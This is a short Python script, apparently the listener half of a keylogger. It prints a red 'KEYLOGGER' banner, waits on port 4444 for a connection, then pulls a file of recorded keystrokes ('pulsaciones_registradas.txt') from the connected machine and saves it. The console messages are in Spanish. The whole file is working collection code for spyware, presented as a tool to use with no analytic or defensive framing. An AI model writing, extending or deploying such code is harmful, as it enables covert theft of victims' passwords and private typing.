import socket

def banner() -> None:
    art = """\033[38;2;255;0;0m 
██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
\033[38;2;255;0;0m \033[0m"""
    print(art)

banner()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4444))
server.listen(1)

print("Listening...")
client, address = server.accept()
print(f"[+] Conexión establecida desde {address}")

while True:
    command = input("\n[*] Stop to halt execution: ").strip().lower()
    print("\n")

    if command == "stop":
        client.sendall(command.encode())

        with open("pulsaciones_registradas.txt", "wb") as file:
            while True:
                chunk = client.recv(1024)
                if not chunk:
                    break
                file.write(chunk)

        print("[+] File received.")
        break
    else:
        print("[-] Comando no reconocido. Escribe 'stop' para detener la ejecución.")

client.close()
server.close()